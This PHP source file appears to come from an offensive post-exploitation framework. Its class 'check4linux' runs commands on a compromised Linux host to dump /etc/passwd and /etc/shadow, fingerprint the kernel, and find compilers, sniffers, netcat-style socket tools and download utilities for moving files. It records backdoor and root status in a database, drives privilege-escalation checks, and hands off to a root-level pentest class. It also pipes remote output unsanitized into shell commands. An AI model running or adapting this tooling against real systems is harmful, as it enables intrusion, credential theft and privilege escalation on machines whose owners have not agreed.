<?php

class check4linux extends check4linux8jobs{
    
    
    
    
    
    
    
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
        $this->lan2init();
    }
  
    
    
    public function lan2init(){
        
        $this->titre(__FUNCTION__);
        $tab_tmp = array();

        $this->article("Template ID", $this->template_id);
        //$this->article("Template BASE64 ID", $this->templateB64_id);
        $this->article("Template CMD", $this->template_cmd);
        //$this->article("Template BASE64 CMD",$this->templateB64_cmd);
        $this->article("Template SHELL", $this->template_shell);
        //$this->article("Template BASE64 SHELL",$this->templateB64_shell);
        echo "=============================================================================\n";
        
        $data = "cat /etc/passwd ";
        $tmp = $this->lan2stream4result($data,$this->stream_timeout*2);
        $tmp2 = array();
        exec("echo '$tmp' | grep ':' ",$tmp2);
        $this->etc_passwd_str = $this->tab($tmp2);
        $this->etc_passwd_str = trim($this->etc_passwd_str);
        $this->parse4etc_passwd($this->etc_passwd_str);
        unset($tmp2);
        $this->env_path_str = $this->lan2env4path();
        $this->pause();
        
        $this->lan2init2var();
        //$this->lan2init2app();
        //$this->lan2start();
        
        
        $data = "cat /etc/shadow ";
        $tmp = $this->lan2stream4result($data,$this->stream_timeout);
        exec("echo '$tmp' | grep ':'   ",$tab_tmp);
        $shadow_str = $this->tab($tab_tmp);
        if ( (!empty($shadow_str)) && (strstr($shadow_str, "root:")) ){
           // $this->lan2root8shadow($shadow_str,$this->etc_passwd_str);
        }
        
    }
  
    public function lan2init2var(){
        $this->titre(__FUNCTION__);
        $data = "uname -r";
        $os_kernel = trim($this->lan2stream4result($data,$this->stream_timeout*2));
        
        $data = "uname -s";
        $os_plateforme = trim($this->lan2stream4result($data,$this->stream_timeout*2));
        
        $this->os_kernel_number = trim($this->req_ret_str("echo \"$os_kernel\" | grep -Po \"[2-4]{1}\.[0-9]{1,2}\.[0-9]{1,3}\-[[:print:]]{1,}\" "));
        $this->os_plateforme_name = trim($this->req_ret_str("echo \"$os_plateforme\" | grep -i -E \"(linux|windows|debian|unix)\" "));
        $this->ip2os4arch($this->os_plateforme_name);
        $this->parse4kernel($this->os_kernel_number);
    }
    
    public function lan2init2app(){
        $this->titre(__FUNCTION__);
        $this->note("What development tools/languages are installed/supported?");
        $this->lan2init2app8executable();
        $this->path_compiler_c = $this->lan2init2app8compiler();
        $this->path_snifer = $this->lan2init2app8snifer();
        
        $this->note("How can files be uploaded?");
        $this->path_webbrowser_cli = $this->lan2init2app8webbrowser();
        $this->path_compiler_c = $this->lan2init2app8socket();

        
    }
    
    
    public function lan2init2app8executable(){
        $this->ssTitre(__FUNCTION__);
        $filename = "perl";
        echo $this->lan2file4locate($filename);
        
        $filename = "php";
        echo $this->lan2file4locate($filename);
        
        $filename = "python";
        echo $this->lan2file4locate($filename);
        
        $filename = "ruby";
        echo $this->lan2file4locate($filename);
        
        $filename = "java";
        echo $this->lan2file4locate($filename);
        
        $filename = "go";
        echo $this->lan2file4locate($filename);
        
        $filename = "gdb";
        echo $this->lan2file4locate($filename);
        
        $filename = "find";
        echo $this->lan2file4locate($filename);
        
        $filename = "grep";
        echo $this->lan2file4locate($filename);
        
        $filename = "strings";
        echo $this->lan2file4locate($filename);
    }
    
    public function lan2init2app8snifer(){
        $this->ssTitre(__FUNCTION__);
        $filename = "tcpdump";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        $filename = "nmap";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        $filename = "hping";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        $filename = "hping3";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
    }
    
    public function lan2init2app8socket(){
        $this->ssTitre(__FUNCTION__);
        
        $filename = "socat";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "nc";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "netcat";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
        
        $filename = "ncat";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "tcpbind";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "ssh";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "ftp";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
        
        $filename = "tftp";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
                
        $filename = "telnet";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
 
        
    }
    
    
    public function lan2init2app8webbrowser(){
        $this->ssTitre(__FUNCTION__);
        
        $filename = "wget";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "curl";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "w3m";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
        
        $filename = "elinks";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "lynx";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "fetch";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
        
        $filename = "lwp-download";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
    }
    
    
    public function lan2init2app8compiler(){
        $this->ssTitre(__FUNCTION__);
        
        $filename = "gcc";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "cc";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "clang";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
    }
    
    
    public function uid8db():bool{
        $sql_w = "SELECT id8b64 FROM LAN WHERE $this->lan2where ";
        $query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql_w\"  2>/dev/null \n";
        $this->requette($query);
        fgets(STDIN);
        return $this->checkBD($sql_w); 
    }
    public function lan4root(){
        /*
         https://guide.offsecnewbie.com/privilege-escalation/linux-pe
         https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux
         https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
         */        
        $this->gtitre(__FUNCTION__);
        $sql = "update IP set ip2backdoor=0 where ip2backdoor=1 ;" ;
        $query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
        //$this->requette($query);
        
        $sql = "update IP set ip2root=0 where ip2root=1 ;";
        $query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
        //$this->requette($query);
        
        
        $query = str_replace("%CMD%", "id", $this->template_cmd);
        //$this->requette($query);
        $this->pause();

        $this->rouge($this->id);

        
        if ( $this->uid_name==="root" ) {
            if (!$this->ip2backdoor8db($this->ip2id)) {
                $obj_root = new root4linux($this->eth, $this->domain, $this->ip, $this->port, $this->protocol, $this->stream, $this->templateB64_id, $this->templateB64_cmd, $this->templateB64_shell, $this->uid, $this->uid_name, $this->gid, $this->gid_name, $this->context, $this->uid_pass);
                $obj_root->lan4pentest();$this->pause();               
            }
        }
        else {
            //if (!$this->ip2root8db($this->ip2id)) {$this->misc2();$this->pause();}
            if (!$this->ip2root8db($this->ip2id)) {$this->suids();$this->pause();}   
            //if (!$this->ip2root8db($this->ip2id)) {$this->misc();$this->pause();}
            if (!$this->ip2root8db($this->ip2id)) {$this->users();$this->pause();}
            //if (!$this->ip2root8db($this->ip2id)) {$this->jobs();$this->pause();}
            //if (!$this->ip2root8db($this->ip2id)) {$this->exploits();$this->pause();}
        }
        
        $this->rouge("Brief");
        $sql = "select uid_name,from_base64(templateB64_id),from_base64(templateB64_cmd),from_base64(templateB64_shell),ladate FROM LAN where id8port=$this->port2id ORDER BY ladate ASC ;";

        $req = $this->mysql_ressource->query($sql);
        $chaine = "===========================================================================================================";
        $this->jaune($chaine);
        while ($row = $req->fetch_assoc()) {
            echo "\n";
            $this->jaune($row['uid_name']);
            $date = $row['ladate'];
            $time = date("Y-m-d H:i:s",$date);
            $this->article("Date", $time);
            $this->article("Username", $row['uid_name']);
            $this->article("ID", $row['from_base64(templateB64_id)']);
            $this->article("CMD", $row['from_base64(templateB64_cmd)']);
            $this->article("SHELL", $row['from_base64(templateB64_shell)']);
            
        }
        $this->rouge("END of ".__FUNCTION__);
        $this->jaune($chaine);
        
        $this->pause();
   }
    
   
    
   
   
   
    
}
?>
